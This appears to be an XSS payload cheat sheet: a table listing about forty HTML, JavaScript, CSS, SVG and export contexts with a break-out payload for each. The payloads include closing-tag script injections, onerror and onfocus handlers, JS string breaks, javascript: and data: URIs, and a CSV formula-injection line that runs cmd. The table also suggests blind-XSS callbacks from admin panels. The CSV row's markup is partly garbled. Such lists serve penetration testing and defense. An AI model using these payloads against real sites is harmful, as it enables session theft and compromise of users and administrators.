# Where your payload can hide

<table data-full-width="true"><thead><tr><th>Output Context</th><th>Demo Code</th><th align="right">How to break / execute (key techniques)</th><th>Mandatory considerations</th></tr></thead><tbody><tr><td><strong>HTML text node (paragraph / span / div text)</strong> — reflected as text content inside an element</td><td><code>&#x3C;p>User comment: Hello USER_INPUT&#x3C;/p></code></td><td align="right">1. Close the element then inject tags: <code>&#x3C;/p>&#x3C;script>alert(1)&#x3C;/script></code> 2. Inject an element with an event: <code>&#x3C;/p>&#x3C;img src=x onerror=alert(1)></code></td><td>You must close the parent element; ensure you match HTML structure. Some browsers autocorrect malformed HTML.</td></tr><tr><td><strong>Heading tag (h1/h2...)</strong></td><td><code>&#x3C;h1>Welcome, USER_INPUT&#x3C;/h1></code></td><td align="right">1. Close heading then inject script: <code>&#x3C;/h1>&#x3C;script>alert(1)&#x3C;/script></code> 2. Insert tag with handler: <code>&#x3C;/h1>&#x3C;img src=x onerror=alert(1)></code></td><td>Must close heading; if input is sanitized for <code>&#x3C;></code> it may block direct tags.</td></tr><tr><td><strong>Inside attribute value (double-quoted)</strong></td><td><code>&#x3C;a href="#" title="USER_INPUT">Link&#x3C;/a></code></td><td align="right">1. Break out of quotes then add attribute/JS: <code>" onmouseover="alert(1)</code> → results: <code>title="" onmouseover="alert(1)"</code> 2. Close quote + <code>></code> then add element: <code>" >&#x3C;script>alert(1)&#x3C;/script></code></td><td>Respect surrounding quote type (double vs single). If input is inserted raw, must escape existing quotes or close them.</td></tr><tr><td><strong>Inside attribute value (single-quoted)</strong></td><td><code>&#x3C;input value='USER_INPUT' /></code></td><td align="right">Same as double-quoted but close with <code>'</code> : <code>' onfocus='alert(1)</code> → <code>value='' onfocus='alert(1)'</code></td><td>Use correct quote char to break out.</td></tr><tr><td><strong>Unquoted attribute</strong></td><td><code>&#x3C;div data-user=USER_INPUT>Hi&#x3C;/div></code></td><td align="right">1. Inject whitespace + attribute: <code>>&#x3C;script>alert(1)&#x3C;/script></code> or <code>onmouseover=alert(1)</code> 2. If value contains <code>></code> you may break element.</td><td>Unquoted attributes are easier to break — but some servers enforce quotes.</td></tr><tr><td><strong>Attribute URL (href/src) with <code>javascript:</code> allowed</strong></td><td><code>&#x3C;a href="USER_INPUT">Click&#x3C;/a></code></td><td align="right">1. Inject <code>javascript:alert(1)</code> directly: <code>javascript:alert(1)</code> 2. Break out of attribute and add <code>onmouseover</code> if needed.</td><td>Modern browsers may block <code>javascript:</code> in some contexts; sanitizers often remove it.</td></tr><tr><td><strong><code>srcset</code> / <code>src</code> or image attributes</strong></td><td><code>&#x3C;img src="USER_INPUT" alt=""></code></td><td align="right">1. Use <code>x" onerror="alert(1)</code> to close and add onerror: <code>src="x" onerror="alert(1)"</code> 2. Use <code>data:</code> URI containing JS in legacy contexts (rare).</td><td><code>onerror</code> on images is a common vector; ensure you close quotes correctly.</td></tr><tr><td><strong>Inline event attribute (<code>onclick</code>, <code>onerror</code> etc.)</strong></td><td><code>&#x3C;button onclick="doThing('USER_INPUT')">Go&#x3C;/button></code></td><td align="right">1. Break JS string or attribute: <code>');alert(1);//</code> → <code>doThing('');alert(1);//')</code> 2. If attribute is entirely user-defined, set to <code>alert(1)</code></td><td>Must consider JS string quoting and escaping (single vs double). Breaking out of function call requires injecting correctly-terminated payload.</td></tr><tr><td><strong><code>value</code> of input element</strong></td><td><code>&#x3C;input type="text" value="USER_INPUT" /></code></td><td align="right">1. Close quote and add handler: <code>" onfocus="alert(1)"</code> → <code>value="" onfocus="alert(1)"</code> 2. Inject <code>onmouseover</code> via closing <code>></code>: <code>">&#x3C;img src=x onerror=alert(1)></code></td><td>Many inputs are re-used for forms; user cannot always trigger events — add <code>autofocus</code> or <code>onload</code> on ancillary elements if possible.</td></tr><tr><td><strong>Textarea content</strong></td><td><code>&#x3C;textarea>USER_INPUT&#x3C;/textarea></code></td><td align="right">1. Close textarea then add script (textarea is text-only): <code>&#x3C;/textarea>&#x3C;script>alert(1)&#x3C;/script></code></td><td>You cannot execute HTML <em>inside</em> the textarea; closing <code>&#x3C;/textarea></code> is mandatory to escape.</td></tr><tr><td><strong>HTML comment</strong></td><td><code>&#x3C;!-- USER_INPUT --></code> rendered in page source</td><td align="right">1. Close comment then inject: <code>-->&#x3C;script>alert(1)&#x3C;/script></code></td><td>Must terminate <code>--></code>. Some renderers strip comments from HTML output to users.</td></tr><tr><td><strong>Script block — JS string (single-quoted)</strong></td><td><code>&#x3C;script>var name = 'USER_INPUT';&#x3C;/script></code></td><td align="right">1. Break string and append code: <code>' ; alert(1); //</code> → <code>var name = ''; alert(1); //';</code> 2. Use <code>&#x3C;/script></code> injection if strings not possible: <code>&#x3C;/script>&#x3C;script>alert(1)&#x3C;/script></code></td><td>Must respect JS quoting/escaping and semicolons; JSON-encoded values may be safe if properly quoted.</td></tr><tr><td><strong>Script block — JS string (double-quoted)</strong></td><td><code>&#x3C;script>var data = "USER_INPUT";&#x3C;/script></code></td><td align="right">Same as single-quoted but use <code>"</code> to break: <code>";alert(1);//</code></td><td>Take care with escaping (backslashes, newlines).</td></tr><tr><td><strong>Script block — template literal / backticks</strong></td><td><code>&#x3C;script>const t = \</code>USER_INPUT`;`</td><td align="right">1. Break backtick: <code>`;alert(1);//</code> 2. Inject <code>${...}</code> if templating evaluated later</td><td>Template literal break requires closing backtick; newlines may change behavior.</td></tr><tr><td><strong>Script block — inline JSON (<code>&#x3C;script type="application/json"></code>)</strong></td><td><code>&#x3C;script type="application/json">{"name":"USER_INPUT"}&#x3C;/script></code></td><td align="right">1. Close JSON then inject new <code>&#x3C;script></code> using <code>&#x3C;/script></code> injection if allowed: <code>"&#x3C;/script>&#x3C;script>alert(1)&#x3C;/script></code> 2. If the JSON is parsed and inserted into DOM later as <code>innerHTML</code>, break that later context</td><td>JSON inside script is inert until parsed; injection requires breaking out of the script tag (closing tag string).</td></tr><tr><td><strong>JSONP / callback name</strong></td><td><code>?callback=USER_INPUT</code> producing <code>&#x3C;script>USER_INPUT({...})&#x3C;/script></code></td><td align="right">1. Control callback name: <code>alert(1);foo</code> → <code>alert(1);foo({...})</code> or <code>callback=alert(1)//</code> 2. Close and add <code>&#x3C;/script></code> if allowed</td><td>Many frameworks restrict callback names to identifiers; if not validated, it's very powerful.</td></tr><tr><td><strong>DOM <code>innerHTML</code> (client-side insertion)</strong></td><td><code>el.innerHTML = 'USER_INPUT';</code></td><td align="right">1. Insert tags directly: <code>&#x3C;img src=x onerror=alert(1)></code> or <code>&#x3C;script>alert(1)&#x3C;/script></code> 2. If using template strings, follow JS string breaking above</td><td>If code uses <code>textContent</code>/<code>innerText</code> instead, injection fails. Know which API is used.</td></tr><tr><td><strong>DOM <code>textContent</code> / <code>innerText</code></strong></td><td><code>el.textContent = 'USER_INPUT';</code></td><td align="right">1. Cannot create HTML/JS — need to find upstream where HTML is built; break the code that sets innerHTML instead. 2. Exploit if later inserted into HTML via <code>innerHTML</code>.</td><td><code>textContent</code>/<code>innerText</code> escape HTML — this context resists XSS unless other vulnerabilities exist.</td></tr><tr><td><strong>document.write / document.writeln</strong></td><td><code>&#x3C;script>document.write('USER_INPUT')&#x3C;/script></code></td><td align="right">1. Inject HTML directly: <code>&#x3C;script>alert(1)&#x3C;/script></code> or <code>&#x3C;img onerror=alert(1)></code> 2. Break JS string if used as <code>document.write('...')</code></td><td>Same JS string-escaping concerns; document.write executes immediately.</td></tr><tr><td><strong>setTimeout / setInterval with string argument</strong></td><td><code>setTimeout('USER_INPUT', 1000);</code></td><td align="right">1. Provide JS code string: <code>alert(1)</code> → <code>setTimeout('alert(1)',1000)</code></td><td>If function reference is used instead of string, injection may be harder.</td></tr><tr><td><strong>CSS / style tag</strong></td><td><code>&#x3C;style> .name { background-image: url("USER_INPUT"); } &#x3C;/style></code></td><td align="right">1. Inject <code>url("javascript:alert(1)")</code> (legacy) 2. Break out and close <code>&#x3C;/style></code> then add <code>&#x3C;script></code>: <code>&#x3C;/style>&#x3C;script>alert(1)&#x3C;/script></code></td><td>Modern browsers disallow <code>javascript:</code> in CSS <code>url()</code> for many contexts. Closing <code>&#x3C;/style></code> is a reliable technique if possible.</td></tr><tr><td><strong>Inline <code>style</code> attribute</strong></td><td><code>&#x3C;div style="background-image:url('USER_INPUT')"></code></td><td align="right">1. Break style and add <code>&#x3C;/div>&#x3C;script></code> or use <code>expression()</code> in legacy IE: <code>);}&#x3C;/style>&#x3C;script>...</code></td><td><code>expression()</code> is legacy; modern CSS vectors are limited.</td></tr><tr><td><strong>SVG element content / attribute</strong></td><td><code>&#x3C;svg>...&#x3C;text>USER_INPUT&#x3C;/text>...&#x3C;/svg></code> or <code>&#x3C;svg>&#x3C;image xlink:href="USER_INPUT"/>&#x3C;/svg></code></td><td align="right">1. Break out of text/attribute and inject <code>&#x3C;script></code> or event attributes: <code>&#x3C;/text>&#x3C;script>alert(1)&#x3C;/script></code> 2. Use <code>onload</code>/<code>onerror</code> on SVG elements: <code>&#x3C;image onerror=alert(1)></code> 3. Use <code>&#x3C;foreignObject></code> to embed HTML.</td><td>SVG supports event attributes; some contexts sanitize differently than HTML.</td></tr><tr><td><strong><code>iframe srcdoc</code> or <code>src</code></strong></td><td><code>&#x3C;iframe srcdoc="USER_INPUT">&#x3C;/iframe></code></td><td align="right">1. Inject full HTML into <code>srcdoc</code>: <code>&#x3C;!doctype html>&#x3C;script>alert(1)&#x3C;/script></code> 2. If <code>src</code> attribute is set to <code>data:</code> URI, use <code>data:text/html,&#x3C;script>alert(1)&#x3C;/script></code></td><td><code>srcdoc</code> accepts HTML; <code>src</code> to <code>data:</code> can yield execution. Browser security (sandbox) may mitigate.</td></tr><tr><td><strong><code>srcdoc</code> or <code>src</code> of embed/object</strong></td><td><code>&#x3C;object data="USER_INPUT">&#x3C;/object></code></td><td align="right">1. Point to attacker-controlled HTML or data URI with script. 2. If attributes are injectable, add <code>onload</code>/<code>onerror</code> handlers.</td><td>Plugin/embed behavior varies by browser; many modern browsers restrict scripts in some embed contexts.</td></tr><tr><td><strong>Meta tags / OpenGraph / title</strong></td><td><code>&#x3C;meta property="og:description" content="USER_INPUT"/></code> <code>&#x3C;title>USER_INPUT&#x3C;/title></code></td><td align="right">1. Close tag sequence and inject element: <code>"/>&#x3C;script>alert(1)&#x3C;/script></code> 2. Title injection often needs closing <code>&#x3C;/title></code> to add script.</td><td>Meta content is often not rendered as HTML; but some admin panels display the raw HTML and can execute.</td></tr><tr><td><strong>Attributes used for JS eval (e.g., <code>new Function(...)</code>)</strong></td><td><code>new Function("return 'USER_INPUT'")()</code></td><td align="right">1. Close string and append code: <code>' ; alert(1); //</code></td><td>If application constructs functions from untrusted input, injection becomes direct code execution.</td></tr><tr><td><strong>Server-side rendered attribute inside JS object</strong></td><td><code>&#x3C;script>var cfg = {name: "USER_INPUT"}&#x3C;/script></code></td><td align="right">1. Break string to inject code: <code>"; alert(1); var a="</code></td><td>Same JS quoting rules apply.</td></tr><tr><td><strong>Email HTML / newsletter rendering</strong></td><td><code>&#x3C;div>From: USER_INPUT&#x3C;/div></code> in email body</td><td align="right">1. Close element and inject <code>&#x3C;img src=x onerror=alert(1)></code> or <code>&#x3C;script></code> (many email clients strip scripts)</td><td>Many email clients strip JS; however admin UI that previews HTML emails may execute scripts.</td></tr><tr><td><strong>Logs / admin panels (rendered HTML of logs)</strong></td><td><code>&#x3C;pre>USER_INPUT&#x3C;/pre></code> (log viewer renders HTML)</td><td align="right">1. Close <code>pre</code> and inject script: <code>&#x3C;/pre>&#x3C;script>alert(1)&#x3C;/script></code> 2. Use markup that log viewer renders as HTML (e.g., markup-enabled dashboards)</td><td>Some log viewers escape HTML; others allow rich content. Test the admin UI rendering mode.</td></tr><tr><td><strong>CSV / Excel / spreadsheet export (re-opened in Excel)</strong></td><td><code>cell, USER_INPUT</code> exported to CSV</td><td align="right">1. For CSV, use `=cmd</td><td>' /C calc'!A0<code>or</code>=HYPERLINK("javascript:...")` (Excel macro/Formula Injection) 2. For HTML export, close tags and inject script.</td></tr><tr><td><strong>Search results snippets / meta-summaries</strong></td><td><code>&#x3C;div class="snippet">USER_INPUT&#x3C;/div></code></td><td align="right">1. Close snippet and inject tags: <code>&#x3C;/div>&#x3C;script>...&#x3C;/script></code> 2. If snippet is inserted via <code>textContent</code>, injection fails</td><td>Search snippet engines often sanitize heavily — but admin preview pages might not.</td></tr><tr><td><strong>Rendered Markdown / WYSIWYG output</strong></td><td><code>&#x3C;!-- user markdown converted -> HTML --> &#x3C;div>USER_INPUT_HTML&#x3C;/div></code></td><td align="right">1. Inject raw HTML in markdown (e.g., <code>&#x3C;img onerror=alert(1)></code>) 2. Close wrapper if only plain text allowed and add tags after <code>&#x3C;/div></code></td><td>WYSIWYG sanitizers may allow some tags. Markdown-to-HTML pipelines sometimes permit inline HTML.</td></tr><tr><td><strong>Template engines (server-side) — attribute vs text vs raw access</strong></td><td><code>{{ user_name }}</code> vs <code>{{{ user_name }}}</code> in templates</td><td align="right">1. If raw/unescaped rendering (e.g., <code>{{{ }}}</code>) then inject <code>&#x3C;script></code> directly. 2. If escaped, try breaking surrounding markup.</td><td>Know whether the template auto-escapes. Different engines have different safe/unsafe tags.</td></tr><tr><td><strong><code>window.name</code> &#x26; cross-document storage</strong></td><td><code>iframe.contentWindow.name = "USER_INPUT"</code> then rendered in another page</td><td align="right">1. Supply HTML in <code>window.name</code> then open into page that <code>document.write(window.name)</code> → executes HTML</td><td>The receiving page must explicitly use <code>window.name</code> as HTML; modern apps rarely do but some legacy flows do.</td></tr><tr><td><strong><code>postMessage</code> data used to build HTML</strong></td><td><code>window.postMessage("USER_INPUT", "*")</code> and receiver <code>el.innerHTML = event.data</code></td><td align="right">1. Send HTML containing script or event handlers: <code>&#x3C;img src=x onerror=alert(1)></code></td><td>Break depends on receiver using <code>innerHTML</code> vs safe parsing.</td></tr><tr><td><strong>Dynamic CSS selectors or class names injected into <code>&#x3C;style></code></strong></td><td><code>&#x3C;style>.user-USER_INPUT {}&#x3C;/style></code></td><td align="right">1. Break style and inject <code>&#x3C;/style>&#x3C;script>alert(1)&#x3C;/script></code></td><td>Class names are usually safe; closing <code>&#x3C;/style></code> is required to inject scripts.</td></tr><tr><td><strong><code>data:</code> URIs generated from user input and embedded</strong></td><td><code>&#x3C;iframe src="data:text/html,USER_INPUT">&#x3C;/iframe></code></td><td align="right">1. Put full HTML with <code>&#x3C;script></code> in the <code>data:</code> payload: <code>&#x3C;script>alert(1)&#x3C;/script></code></td><td>Data URIs must be allowed and generated raw; many apps encode them or sanitize.</td></tr><tr><td><strong>Server-side template that builds attributes in JS (concatenation)</strong></td><td><code>&#x3C;script>el.setAttribute('data', 'prefix' + USER_INPUT)&#x3C;/script></code></td><td align="right">1. Break JS string via same JS string techniques or inject <code>&#x3C;/script></code></td><td>Know how server concatenates — escaping may be inconsistent.</td></tr><tr><td><strong><code>document.domain</code> / base tag impacts</strong></td><td><code>&#x3C;base href="USER_INPUT"></code></td><td align="right">1. Changing base can cause relative URLs to load attacker content, not direct JS execution but can enable other attacks.</td><td>The base tag modifies URL resolution; injection may be impactful in chained attacks.</td></tr><tr><td><strong>Admin email preview / ticket system (HTML preview of user content)</strong></td><td><code>&#x3C;!-- admin panel displays user-submitted HTML --> &#x3C;div>USER_INPUT&#x3C;/div></code></td><td align="right">1. Close and inject <code>&#x3C;script></code> or <code>&#x3C;img onerror></code> in preview. 2. Inject links to external blind-XSS manager endpoints for callbacks.</td><td>Admin views often render content unsafely — highly useful for blind XSS.</td></tr><tr><td><strong>Template partials / server-included snippets</strong></td><td>Server includes <code>&#x3C;!-- include user snippet --> USER_INPUT</code> into many pages</td><td align="right">1. Inject HTML to any rendered page (close parent, add script)</td><td>A single persisted field can reach multiple endpoints; map where the partial is included.</td></tr></tbody></table>

